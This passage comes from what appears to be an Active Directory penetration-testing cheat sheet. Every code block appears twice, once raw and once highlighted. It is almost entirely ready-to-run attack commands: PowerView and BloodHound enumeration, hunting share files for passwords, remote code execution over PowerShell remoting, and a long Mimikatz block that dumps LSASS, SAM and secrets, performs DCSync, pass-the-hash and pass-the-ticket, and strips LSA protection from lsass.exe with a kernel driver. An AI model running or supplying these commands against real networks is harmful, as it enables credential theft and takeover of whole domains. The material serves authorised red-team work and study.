<span class="hljs-built_in">Get-DomainGroup</span> | <span class="hljs-built_in">Out-File</span> <span class="hljs-literal">-FilePath</span> .\DomainGroup.txt

<span class="hljs-comment">#Return members of Specific Group (eg. Domain Admins &amp; Enterprise Admins)</span>
<span class="hljs-built_in">Get-DomainGroup</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&#x27;&lt;GroupName&gt;&#x27;</span> | <span class="hljs-built_in">Select-Object</span> <span class="hljs-literal">-ExpandProperty</span> Member
<span class="hljs-built_in">Get-DomainGroupMember</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&#x27;&lt;GroupName&gt;&#x27;</span> | <span class="hljs-built_in">Select-Object</span> MemberDistinguishedName

<span class="hljs-comment">#Enumerate the local groups on the local (or remote) machine. Requires local admin rights on the remote machine</span>
<span class="hljs-built_in">Get-NetLocalGroup</span> | <span class="hljs-built_in">Select-Object</span> GroupName

<span class="hljs-comment">#Enumerates members of a specific local group on the local (or remote) machine. Also requires local admin rights on the remote machine</span>
<span class="hljs-built_in">Get-NetLocalGroupMember</span> <span class="hljs-literal">-GroupName</span> Administrators | <span class="hljs-built_in">Select-Object</span> MemberName, IsGroup, IsDomain

<span class="hljs-comment">#Return all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences</span>
<span class="hljs-built_in">Get-DomainGPOLocalGroup</span> | <span class="hljs-built_in">Select-Object</span> GPODisplayName, GroupName</code></pre></div>
</li>
<li>
<p><strong>Enumerate Shares:</strong></p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Enumerate Domain Shares
Find-DomainShare

#Enumerate Domain Shares the current user has access
Find-DomainShare -CheckShareAccess

#Enumerate &quot;Interesting&quot; Files on accessible shares
Find-InterestingDomainShareFile -Include *passwords*</pre><pre class="hljs"><code><span class="hljs-comment">#Enumerate Domain Shares</span>
<span class="hljs-built_in">Find-DomainShare</span>

<span class="hljs-comment">#Enumerate Domain Shares the current user has access</span>
<span class="hljs-built_in">Find-DomainShare</span> <span class="hljs-literal">-CheckShareAccess</span>

<span class="hljs-comment">#Enumerate &quot;Interesting&quot; Files on accessible shares</span>
<span class="hljs-built_in">Find-InterestingDomainShareFile</span> <span class="hljs-literal">-Include</span> *passwords*</code></pre></div>
</li>
<li>
<p><strong>Enum Group Policies:</strong></p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName

#Enumerate all GPOs to a specific computer
Get-DomainGPO -ComputerIdentity &lt;ComputerName&gt; -Properties DisplayName | Sort-Object -Property DisplayName

#Get users that are part of a Machine's local Admin group
Get-DomainGPOComputerLocalGroupMapping -ComputerName &lt;ComputerName&gt;</pre><pre class="hljs"><code><span class="hljs-built_in">Get-DomainGPO</span> <span class="hljs-literal">-Properties</span> DisplayName | <span class="hljs-built_in">Sort-Object</span> <span class="hljs-literal">-Property</span> DisplayName

<span class="hljs-comment">#Enumerate all GPOs to a specific computer</span>
<span class="hljs-built_in">Get-DomainGPO</span> <span class="hljs-literal">-ComputerIdentity</span> &lt;ComputerName&gt; <span class="hljs-literal">-Properties</span> DisplayName | <span class="hljs-built_in">Sort-Object</span> <span class="hljs-literal">-Property</span> DisplayName

<span class="hljs-comment">#Get users that are part of a Machine&#x27;s local Admin group</span>
<span class="hljs-built_in">Get-DomainGPOComputerLocalGroupMapping</span> <span class="hljs-literal">-ComputerName</span> &lt;ComputerName&gt;</code></pre></div>
</li>
<li>
<p><strong>Enum OUs:</strong></p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">Get-DomainOU -Properties Name | Sort-Object -Property Name</pre><pre class="hljs"><code><span class="hljs-built_in">Get-DomainOU</span> <span class="hljs-literal">-Properties</span> Name | <span class="hljs-built_in">Sort-Object</span> <span class="hljs-literal">-Property</span> Name</code></pre></div>
</li>
<li>
<p><strong>Enum ACLs:</strong></p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```"># Returns the ACLs associated with the specified account
Get-DomaiObjectAcl -Identity &lt;AccountName&gt; -ResolveGUIDs

#Search for interesting ACEs
Find-InterestingDomainAcl -ResolveGUIDs

#Check the ACLs associated with a specified path (e.g smb share)
Get-PathAcl -Path &quot;\\Path\Of\A\Share&quot;</pre><pre class="hljs"><code><span class="hljs-comment"># Returns the ACLs associated with the specified account</span>
<span class="hljs-built_in">Get-DomaiObjectAcl</span> <span class="hljs-literal">-Identity</span> &lt;AccountName&gt; <span class="hljs-literal">-ResolveGUIDs</span>

<span class="hljs-comment">#Search for interesting ACEs</span>
<span class="hljs-built_in">Find-InterestingDomainAcl</span> <span class="hljs-literal">-ResolveGUIDs</span>

<span class="hljs-comment">#Check the ACLs associated with a specified path (e.g smb share)</span>
<span class="hljs-built_in">Get-PathAcl</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;\\Path\Of\A\Share&quot;</span></code></pre></div>
</li>
<li>
<p><strong>Enum Domain Trust:</strong></p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">Get-DomainTrust
Get-DomainTrust -Domain &lt;DomainName&gt;

#Enumerate all trusts for the current domain and then enumerates all trusts for each domain it finds
Get-DomainTrustMapping</pre><pre class="hljs"><code><span class="hljs-built_in">Get-DomainTrust</span>
<span class="hljs-built_in">Get-DomainTrust</span> <span class="hljs-literal">-Domain</span> &lt;DomainName&gt;

<span class="hljs-comment">#Enumerate all trusts for the current domain and then enumerates all trusts for each domain it finds</span>
<span class="hljs-built_in">Get-DomainTrustMapping</span></code></pre></div>
</li>
<li>
<p><strong>Enum Forest Trust:</strong></p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">Get-ForestDomain
Get-ForestDomain -Forest &lt;ForestName&gt;

#Map the Trust of the Forest
Get-ForestTrust
Get-ForestTrust -Forest &lt;ForestName&gt;</pre><pre class="hljs"><code><span class="hljs-built_in">Get-ForestDomain</span>
<span class="hljs-built_in">Get-ForestDomain</span> <span class="hljs-literal">-Forest</span> &lt;ForestName&gt;

<span class="hljs-comment">#Map the Trust of the Forest</span>
<span class="hljs-built_in">Get-ForestTrust</span>
<span class="hljs-built_in">Get-ForestTrust</span> <span class="hljs-literal">-Forest</span> &lt;ForestName&gt;</code></pre></div>
</li>
<li>
<p><strong>User Hunting:</strong></p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Finds all machines on the current domain where the current user has local admin access
Find-LocalAdminAccess -Verbose

#Find local admins on all machines of the domain
Find-DomainLocalGroupMember -Verbose

#Find computers were a Domain Admin OR a spesified user has a session
Find-DomainUserLocation | Select-Object UserName, SessionFromName

#Confirming admin access
Test-AdminAccess</pre><pre class="hljs"><code><span class="hljs-comment">#Finds all machines on the current domain where the current user has local admin access</span>
<span class="hljs-built_in">Find-LocalAdminAccess</span> <span class="hljs-literal">-Verbose</span>

<span class="hljs-comment">#Find local admins on all machines of the domain</span>
<span class="hljs-built_in">Find-DomainLocalGroupMember</span> <span class="hljs-literal">-Verbose</span>

<span class="hljs-comment">#Find computers were a Domain Admin OR a spesified user has a session</span>
<span class="hljs-built_in">Find-DomainUserLocation</span> | <span class="hljs-built_in">Select-Object</span> UserName, SessionFromName

<span class="hljs-comment">#Confirming admin access</span>
<span class="hljs-built_in">Test-AdminAccess</span></code></pre></div>
<p>:heavy_exclamation_mark: <strong>Priv Esc to Domain Admin with User Hunting:</strong> <br>
I have local admin access on a machine -&gt; A Domain Admin has a session on that machine -&gt; I steal his token and impersonate him -&gt; Profit!</p>
</li>
</ul>
<h3 id="using-ad-module">Using AD Module</h3>
<ul>
<li>
<p><strong>Get Current Domain:</strong> <code class="inline-code">Get-ADDomain</code></p>
</li>
<li>
<p><strong>Enum Other Domains:</strong> <code class="inline-code">Get-ADDomain -Identity &lt;Domain&gt;</code></p>
</li>
<li>
<p><strong>Get Domain SID:</strong> <code class="inline-code">Get-DomainSID</code></p>
</li>
<li>
<p><strong>Get Domain Controlers:</strong></p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">Get-ADDomainController
Get-ADDomainController -Identity &lt;DomainName&gt;</pre><pre class="hljs"><code><span class="hljs-built_in">Get-ADDomainController</span>
<span class="hljs-built_in">Get-ADDomainController</span> <span class="hljs-literal">-Identity</span> &lt;DomainName&gt;</code></pre></div>
</li>
<li>
<p><strong>Enumerate Domain Users:</strong></p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">Get-ADUser -Filter * -Identity &lt;user&gt; -Properties *

#Get a spesific &quot;string&quot; on a user's attribute
Get-ADUser -Filter 'Description -like &quot;*wtver*&quot;' -Properties Description | select Name, Description</pre><pre class="hljs"><code><span class="hljs-built_in">Get-ADUser</span> <span class="hljs-literal">-Filter</span> * <span class="hljs-literal">-Identity</span> &lt;user&gt; <span class="hljs-literal">-Properties</span> *

<span class="hljs-comment">#Get a spesific &quot;string&quot; on a user&#x27;s attribute</span>
<span class="hljs-built_in">Get-ADUser</span> <span class="hljs-literal">-Filter</span> <span class="hljs-string">&#x27;Description -like &quot;*wtver*&quot;&#x27;</span> <span class="hljs-literal">-Properties</span> Description | <span class="hljs-built_in">select</span> Name, Description</code></pre></div>
</li>
<li>
<p><strong>Enum Domain Computers:</strong></p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">Get-ADComputer -Filter * -Properties *
Get-ADGroup -Filter *</pre><pre class="hljs"><code><span class="hljs-built_in">Get-ADComputer</span> <span class="hljs-literal">-Filter</span> * <span class="hljs-literal">-Properties</span> *
<span class="hljs-built_in">Get-ADGroup</span> <span class="hljs-literal">-Filter</span> *</code></pre></div>
</li>
<li>
<p><strong>Enum Domain Trust:</strong></p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">Get-ADTrust -Filter *
Get-ADTrust -Identity &lt;DomainName&gt;</pre><pre class="hljs"><code><span class="hljs-built_in">Get-ADTrust</span> <span class="hljs-literal">-Filter</span> *
<span class="hljs-built_in">Get-ADTrust</span> <span class="hljs-literal">-Identity</span> &lt;DomainName&gt;</code></pre></div>
</li>
<li>
<p><strong>Enum Forest Trust:</strong></p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">Get-ADForest
Get-ADForest -Identity &lt;ForestName&gt;

#Domains of Forest Enumeration
(Get-ADForest).Domains</pre><pre class="hljs"><code><span class="hljs-built_in">Get-ADForest</span>
<span class="hljs-built_in">Get-ADForest</span> <span class="hljs-literal">-Identity</span> &lt;ForestName&gt;

<span class="hljs-comment">#Domains of Forest Enumeration</span>
(<span class="hljs-built_in">Get-ADForest</span>).Domains</code></pre></div>
</li>
<li>
<p><strong>Enum Local AppLocker Effective Policy:</strong></p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</pre><pre class="hljs"><code><span class="hljs-built_in">Get-AppLockerPolicy</span> <span class="hljs-literal">-Effective</span> | <span class="hljs-built_in">select</span> <span class="hljs-literal">-ExpandProperty</span> RuleCollections</code></pre></div>
</li>
</ul>
<h3 id="using-bloodhound">Using BloodHound</h3>
<h4 id="remote-bloodhound">Remote BloodHound</h4>
<p><a data-from-md title='https://github.com/fox-it/BloodHound.py' href='https://github.com/fox-it/BloodHound.py'>Python BloodHound Repository</a> or install it with <code class="inline-code">pip3 install bloodhound</code></p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">bloodhound-python -u &lt;UserName&gt; -p &lt;Password&gt; -ns &lt;Domain Controller's Ip&gt; -d &lt;Domain&gt; -c All</pre><pre class="hljs"><code>bloodhound<span class="hljs-literal">-python</span> <span class="hljs-literal">-u</span> &lt;UserName&gt; <span class="hljs-literal">-p</span> &lt;Password&gt; <span class="hljs-literal">-ns</span> &lt;Domain Controller<span class="hljs-string">&#x27;s Ip&gt; -d &lt;Domain&gt; -c All</span></code></pre></div>
<h4 id="on-site-bloodhound">On Site BloodHound</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Using exe ingestor
.\SharpHound.exe --CollectionMethod All --LdapUsername &lt;UserName&gt; --LdapPassword &lt;Password&gt; --domain &lt;Domain&gt; --domaincontroller &lt;Domain Controller's Ip&gt; --OutputDirectory &lt;PathToFile&gt;

#Using PowerShell module ingestor
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All --LdapUsername &lt;UserName&gt; --LdapPassword &lt;Password&gt; --OutputDirectory &lt;PathToFile&gt;</pre><pre class="hljs"><code><span class="hljs-comment">#Using exe ingestor</span>
.\SharpHound.exe <span class="hljs-literal">--CollectionMethod</span> All <span class="hljs-literal">--LdapUsername</span> &lt;UserName&gt; <span class="hljs-literal">--LdapPassword</span> &lt;Password&gt; <span class="hljs-literal">--domain</span> &lt;Domain&gt; <span class="hljs-literal">--domaincontroller</span> &lt;Domain Controller<span class="hljs-string">&#x27;s Ip&gt; --OutputDirectory &lt;PathToFile&gt;

#Using PowerShell module ingestor
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All --LdapUsername &lt;UserName&gt; --LdapPassword &lt;Password&gt; --OutputDirectory &lt;PathToFile&gt;</span></code></pre></div>
<h3 id="using-adalanche">Using Adalanche</h3>
<h4 id="remote-adalanche">Remote Adalanche</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="bash" data-joplin-source-open="```bash&#10;" data-joplin-source-close="&#10;```"># kali linux:
./adalanche collect activedirectory --domain &lt;Domain&gt; \
--username &lt;Username@Domain&gt; --password &lt;Password&gt; \
--server &lt;DC&gt;

# Example:
./adalanche collect activedirectory --domain windcorp.local \
--username spoNge369@windcorp.local --password 'password123!' \
--server dc.windcorp.htb
## -&gt; Terminating successfully

## Any error?:

# LDAP Result Code 200 &quot;Network Error&quot;: x509: certificate signed by unknown authority ?

./adalanche collect activedirectory --domain windcorp.local \
--username spoNge369@windcorp.local --password 'password123!' \
--server dc.windcorp.htb --tlsmode NoTLS --port 389

# Invalid Credentials ?
./adalanche collect activedirectory --domain windcorp.local \
--username spoNge369@windcorp.local --password 'password123!' \
--server dc.windcorp.htb --tlsmode NoTLS --port 389 \
--authmode basic

# Analyze data 
# go to web browser -&gt; 127.0.0.1:8080
./adalanche analyze</pre><pre class="hljs"><code><span class="hljs-comment"># kali linux:</span>
./adalanche collect activedirectory --domain &lt;Domain&gt; \
--username &lt;Username@Domain&gt; --password &lt;Password&gt; \
--server &lt;DC&gt;

<span class="hljs-comment"># Example:</span>
./adalanche collect activedirectory --domain windcorp.local \
--username spoNge369@windcorp.local --password <span class="hljs-string">&#x27;password123!&#x27;</span> \
--server dc.windcorp.htb
<span class="hljs-comment">## -&gt; Terminating successfully</span>

<span class="hljs-comment">## Any error?:</span>

<span class="hljs-comment"># LDAP Result Code 200 &quot;Network Error&quot;: x509: certificate signed by unknown authority ?</span>

./adalanche collect activedirectory --domain windcorp.local \
--username spoNge369@windcorp.local --password <span class="hljs-string">&#x27;password123!&#x27;</span> \
--server dc.windcorp.htb --tlsmode NoTLS --port 389

<span class="hljs-comment"># Invalid Credentials ?</span>
./adalanche collect activedirectory --domain windcorp.local \
--username spoNge369@windcorp.local --password <span class="hljs-string">&#x27;password123!&#x27;</span> \
--server dc.windcorp.htb --tlsmode NoTLS --port 389 \
--authmode basic

<span class="hljs-comment"># Analyze data </span>
<span class="hljs-comment"># go to web browser -&gt; 127.0.0.1:8080</span>
./adalanche analyze</code></pre></div>
<h3 id="useful-enumeration-tools">Useful Enumeration Tools</h3>
<ul>
<li><a data-from-md title='https://github.com/dirkjanm/ldapdomaindump' href='https://github.com/dirkjanm/ldapdomaindump'>ldapdomaindump</a> Information dumper via LDAP</li>
<li><a data-from-md title='https://github.com/dirkjanm/adidnsdump' href='https://github.com/dirkjanm/adidnsdump'>adidnsdump</a> Integrated DNS dumping by any authenticated user</li>
<li><a data-from-md title='https://github.com/cyberark/ACLight' href='https://github.com/cyberark/ACLight'>ACLight</a> Advanced Discovery of Privileged Accounts</li>
<li><a data-from-md title='https://github.com/sense-of-security/ADRecon' href='https://github.com/sense-of-security/ADRecon'>ADRecon</a> Detailed Active Directory Recon Tool</li>
</ul>
<h2 id="local-privilege-escalation">Local Privilege Escalation</h2>
<ul>
<li>
<p><a data-from-md title='https://github.com/nickvourd/Windows_Privilege_Escalation_CheatSheet' href='https://github.com/nickvourd/Windows_Privilege_Escalation_CheatSheet'>Windows Privilege Escalation CheatSheet</a> Cheat Sheet for Windows Local Privilege Escalations</p>
</li>
<li>
<p><a data-from-md title='https://github.com/ohpe/juicy-potato' href='https://github.com/ohpe/juicy-potato'>Juicy Potato</a> Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation</p>
<p>:warning: Works only until Windows Server 2016 and Windows 10 until patch 1803</p>
</li>
<li>
<p><a data-from-md title='https://github.com/TsukiCTF/Lovely-Potato' href='https://github.com/TsukiCTF/Lovely-Potato'>Lovely Potato</a> Automated Juicy Potato</p>
<p>:warning: Works only until Windows Server 2016 and Windows 10 until patch 1803</p>
</li>
<li>
<p><a data-from-md title='https://github.com/itm4n/PrintSpoofer' href='https://github.com/itm4n/PrintSpoofer'>PrintSpoofer</a> Exploit the PrinterBug for System Impersonation</p>
<p>:pray: Works for Windows Server 2019 and Windows 10</p>
</li>
<li>
<p><a data-from-md title='https://github.com/antonioCoco/RoguePotato' href='https://github.com/antonioCoco/RoguePotato'>RoguePotato</a> Upgraded Juicy Potato</p>
<p>:pray: Works for Windows Server 2019 and Windows 10</p>
</li>
<li>
<p><a data-from-md title='https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/' href='https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/'>Abusing Token Privileges</a></p>
</li>
<li>
<p><a data-from-md title='https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/' href='https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/'>SMBGhost CVE-2020-0796</a> <br>
<a data-from-md title='https://github.com/danigargu/CVE-2020-0796' href='https://github.com/danigargu/CVE-2020-0796'>PoC</a></p>
</li>
<li>
<p><a data-from-md title='https://github.com/cube0x0/CVE-2021-36934' href='https://github.com/cube0x0/CVE-2021-36934'>CVE-2021-36934 (HiveNightmare/SeriousSAM)</a></p>
</li>
</ul>
<h3 id="useful-local-priv-esc-tools">Useful Local Priv Esc Tools</h3>
<ul>
<li><a data-from-md title='https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1' href='https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1'>PowerUp</a> Misconfiguration Abuse</li>
<li><a data-from-md title='https://github.com/AlessandroZ/BeRoot' href='https://github.com/AlessandroZ/BeRoot'>BeRoot</a> General Priv Esc Enumeration Tool</li>
<li><a data-from-md title='https://github.com/enjoiz/Privesc' href='https://github.com/enjoiz/Privesc'>Privesc</a> General Priv Esc Enumeration Tool</li>
<li><a data-from-md title='https://github.com/itm4n/FullPowers' href='https://github.com/itm4n/FullPowers'>FullPowers</a> Restore A Service Account's Privileges</li>
</ul>
<h2 id="lateral-movement-2">Lateral Movement</h2>
<h3 id="powershell-remoting">PowerShell Remoting</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Enable PowerShell Remoting on current Machine (Needs Admin Access)
Enable-PSRemoting

#Entering or Starting a new PSSession (Needs Admin Access)
$sess = New-PSSession -ComputerName &lt;Name&gt;
Enter-PSSession -ComputerName &lt;Name&gt; OR -Sessions &lt;SessionName&gt;</pre><pre class="hljs"><code><span class="hljs-comment">#Enable PowerShell Remoting on current Machine (Needs Admin Access)</span>
<span class="hljs-built_in">Enable-PSRemoting</span>

<span class="hljs-comment">#Entering or Starting a new PSSession (Needs Admin Access)</span>
<span class="hljs-variable">$sess</span> = <span class="hljs-built_in">New-PSSession</span> <span class="hljs-literal">-ComputerName</span> &lt;Name&gt;
<span class="hljs-built_in">Enter-PSSession</span> <span class="hljs-literal">-ComputerName</span> &lt;Name&gt; OR <span class="hljs-literal">-Sessions</span> &lt;SessionName&gt;</code></pre></div>
<h3 id="remote-code-execution-with-ps-credentials">Remote Code Execution with PS Credentials</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">$SecPassword = ConvertTo-SecureString '&lt;Wtver&gt;' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\&lt;WtverUser&gt;', $SecPassword)
Invoke-Command -ComputerName &lt;WtverMachine&gt; -Credential $Cred -ScriptBlock {whoami}</pre><pre class="hljs"><code><span class="hljs-variable">$SecPassword</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&#x27;&lt;Wtver&gt;&#x27;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>
<span class="hljs-variable">$Cred</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="hljs-string">&#x27;htb.local\&lt;WtverUser&gt;&#x27;</span>, <span class="hljs-variable">$SecPassword</span>)
<span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ComputerName</span> &lt;WtverMachine&gt; <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Cred</span> <span class="hljs-literal">-ScriptBlock</span> {whoami}</code></pre></div>
<h3 id="import-a-powershell-module-and-execute-its-functions-remotely">Import a PowerShell Module and Execute its Functions Remotely</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Execute the command and start a session
Invoke-Command -Credential $cred -ComputerName &lt;NameOfComputer&gt; -FilePath c:\FilePath\file.ps1 -Session $sess

#Interact with the session
Enter-PSSession -Session $sess
</pre><pre class="hljs"><code><span class="hljs-comment">#Execute the command and start a session</span>
<span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span> <span class="hljs-literal">-ComputerName</span> &lt;NameOfComputer&gt; <span class="hljs-literal">-FilePath</span> c:\FilePath\file.ps1 <span class="hljs-literal">-Session</span> <span class="hljs-variable">$sess</span>

<span class="hljs-comment">#Interact with the session</span>
<span class="hljs-built_in">Enter-PSSession</span> <span class="hljs-literal">-Session</span> <span class="hljs-variable">$sess</span>
</code></pre></div>
<h3 id="executing-remote-stateful-commands">Executing Remote Stateful commands</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Create a new session
$sess = New-PSSession -ComputerName &lt;NameOfComputer&gt;

#Execute command on the session
Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}

#Check the result of the command to confirm we have an interactive session
Invoke-Command -Session $sess -ScriptBlock {$ps}</pre><pre class="hljs"><code><span class="hljs-comment">#Create a new session</span>
<span class="hljs-variable">$sess</span> = <span class="hljs-built_in">New-PSSession</span> <span class="hljs-literal">-ComputerName</span> &lt;NameOfComputer&gt;

<span class="hljs-comment">#Execute command on the session</span>
<span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-Session</span> <span class="hljs-variable">$sess</span> <span class="hljs-literal">-ScriptBlock</span> {<span class="hljs-variable">$ps</span> = <span class="hljs-built_in">Get-Process</span>}

<span class="hljs-comment">#Check the result of the command to confirm we have an interactive session</span>
<span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-Session</span> <span class="hljs-variable">$sess</span> <span class="hljs-literal">-ScriptBlock</span> {<span class="hljs-variable">$ps</span>}</code></pre></div>
<h3 id="mimikatz-2">Mimikatz</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#The commands are in cobalt strike format!

#Dump LSASS:
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords

#(Over) Pass The Hash
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:&lt;UserName&gt; /ntlm:&lt;&gt; /domain:&lt;DomainFQDN&gt;

#List all available kerberos tickets in memory
mimikatz sekurlsa::tickets

#Dump local Terminal Services credentials
mimikatz sekurlsa::tspkg

#Dump and save LSASS in a file
mimikatz sekurlsa::minidump c:\temp\lsass.dmp

#List cached MasterKeys
mimikatz sekurlsa::dpapi

#List local Kerberos AES Keys
mimikatz sekurlsa::ekeys

#Dump SAM Database
mimikatz lsadump::sam

#Dump SECRETS Database
mimikatz lsadump::secrets

#Inject and dump the Domain Controler's Credentials
mimikatz privilege::debug
mimikatz token::elevate
mimikatz lsadump::lsa /inject

#Dump the Domain's Credentials without touching DC's LSASS and also remotely
mimikatz lsadump::dcsync /domain:&lt;DomainFQDN&gt; /all

#List and Dump local kerberos credentials
mimikatz kerberos::list /dump

#Pass The Ticket
mimikatz kerberos::ptt &lt;PathToKirbiFile&gt;

#List TS/RDP sessions
mimikatz ts::sessions

#List Vault credentials
mimikatz vault::list</pre><pre class="hljs"><code><span class="hljs-comment">#The commands are in cobalt strike format!</span>

<span class="hljs-comment">#Dump LSASS:</span>
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords

<span class="hljs-comment">#(Over) Pass The Hash</span>
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:&lt;UserName&gt; /ntlm:&lt;&gt; /domain:&lt;DomainFQDN&gt;

<span class="hljs-comment">#List all available kerberos tickets in memory</span>
mimikatz sekurlsa::tickets

<span class="hljs-comment">#Dump local Terminal Services credentials</span>
mimikatz sekurlsa::tspkg

<span class="hljs-comment">#Dump and save LSASS in a file</span>
mimikatz sekurlsa::minidump c:\temp\lsass.dmp

<span class="hljs-comment">#List cached MasterKeys</span>
mimikatz sekurlsa::dpapi

<span class="hljs-comment">#List local Kerberos AES Keys</span>
mimikatz sekurlsa::ekeys

<span class="hljs-comment">#Dump SAM Database</span>
mimikatz lsadump::sam

<span class="hljs-comment">#Dump SECRETS Database</span>
mimikatz lsadump::secrets

<span class="hljs-comment">#Inject and dump the Domain Controler&#x27;s Credentials</span>
mimikatz privilege::debug
mimikatz token::elevate
mimikatz lsadump::lsa /inject

<span class="hljs-comment">#Dump the Domain&#x27;s Credentials without touching DC&#x27;s LSASS and also remotely</span>
mimikatz lsadump::dcsync /domain:&lt;DomainFQDN&gt; /all

<span class="hljs-comment">#List and Dump local kerberos credentials</span>
mimikatz kerberos::list /dump

<span class="hljs-comment">#Pass The Ticket</span>
mimikatz kerberos::ptt &lt;PathToKirbiFile&gt;

<span class="hljs-comment">#List TS/RDP sessions</span>
mimikatz ts::sessions

<span class="hljs-comment">#List Vault credentials</span>
mimikatz vault::list</code></pre></div>
<p>:exclamation: What if mimikatz fails to dump credentials because of LSA Protection controls ?</p>
<ul>
<li>
<p>LSA as a Protected Process (Kernel Land Bypass)</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Check if LSA runs as a protected process by looking if the variable &quot;RunAsPPL&quot; is set to 0x1
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa

#Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe
#Now lets import the mimidriver.sys to the system
mimikatz # !+

#Now lets remove the protection flags from lsass.exe process
mimikatz # !processprotect /process:lsass.exe /remove

#Finally run the logonpasswords function to dump lsass
mimikatz # sekurlsa::logonpasswords</pre><pre class="hljs"><code><span class="hljs-comment">#Check if LSA runs as a protected process by looking if the variable &quot;RunAsPPL&quot; is set to 0x1</span>
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa

<span class="hljs-comment">#Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe</span>
<span class="hljs-comment">#Now lets import the mimidriver.sys to the system</span>
mimikatz <span class="hljs-comment"># !+</span>

<span class="hljs-comment">#Now lets remove the protection flags from lsass.exe process</span>
mimikatz <span class="hljs-comment"># !processprotect /process:lsass.exe /remove</span>

<span class="hljs-comment">#Finally run the logonpasswords function to dump lsass</span>
mimikatz <span class="hljs-comment"># sekurlsa::logonpasswords</span></code></pre></div>
</li>
<li>
<p>LSA as a Protected Process (Userland &quot;Fileless&quot; Bypass)</p>
<ul>
<li><a data-from-md title='https://github.com/itm4n/PPLdump' href='https://github.com/itm4n/PPLdump'>PPLdump</a></li>
